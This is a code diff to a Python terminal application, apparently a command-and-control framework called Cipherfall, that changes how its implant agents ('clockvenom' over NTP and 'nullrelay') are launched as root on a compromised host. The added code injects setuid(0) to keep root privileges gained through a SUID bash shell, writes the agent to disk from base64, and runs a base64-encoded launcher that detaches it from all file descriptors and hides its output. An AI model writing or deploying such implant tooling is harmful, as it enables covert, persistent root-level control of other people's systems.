@@ -1274,11 +1274,19 @@ class CipherfallTUI(App):
         # When spawned via SUID bash: ruid=testuser, euid=0.  dash/bash drop euid→ruid
         # inside shell=True subprocesses unless ruid==euid.  Fix: setuid(0) at startup
         # so ruid=euid=0 and subprocesses keep root privileges.
+        _setuid_snippet = (
+            "    if hasattr(os, 'geteuid') and os.geteuid() == 0:\n"
+            "        try:\n            os.setuid(0)\n        except OSError:\n            pass\n"
+        )
+        # NTP agent (clockvenom): def main() opens with global _C2_IP
         agent_text = agent_text.replace(
             "def main():\n    global _C2_IP\n",
-            "def main():\n    global _C2_IP\n"
-            "    if hasattr(os, 'geteuid') and os.geteuid() == 0:\n"
-            "        try:\n            os.setuid(0)\n        except OSError:\n            pass\n",
+            "def main():\n    global _C2_IP\n" + _setuid_snippet,
+        )
+        # CF agent (nullrelay): def main() opens with argv check
+        agent_text = agent_text.replace(
+            "def main():\n    if len(sys.argv)",
+            "def main():\n" + _setuid_snippet + "    if len(sys.argv)",
         )
         if is_ntp:
             # NTP agent recvfrom(2048) silently truncates payloads > ~1.8 KB — AEAD tag
@@ -1325,10 +1333,22 @@ class CipherfallTUI(App):
                     f"echo '[rootagent:spawned]'"
                 )
         else:
+            # CF agent: inline the agent as base64, then use the same FD-clean launcher
+            # as NTP to prevent the pipe write-end inherited from the parent agent's
+            # subprocess.run(capture_output=True) from blocking communicate() indefinitely.
             agent_b64 = base64.b64encode(agent_text.encode()).decode()
+            _launch_src = (
+                f"import os\n"
+                f"os.closerange(3,256)\n"
+                f"null=os.open('/dev/null',os.O_RDWR)\n"
+                f"os.dup2(null,0);os.dup2(null,1);os.dup2(null,2)\n"
+                f"os.close(null)\n"
+                f"os.execv('/usr/bin/python3',['/usr/bin/python3','{ra}'])\n"
+            )
+            _launch_b64 = base64.b64encode(_launch_src.encode()).decode()
             spawn_cmd = (
                 f"printf '%s' '{agent_b64}' | base64 -d > {ra}; "
-                f"{shell_root} -c 'nohup python3 {ra} >/dev/null 2>&1 & echo ok'; "
+                f"{shell_root} -c 'printf %s {_launch_b64}|base64 -d|python3 & echo ok'; "
                 f"echo '[rootagent:spawned]'"
             )
         try:
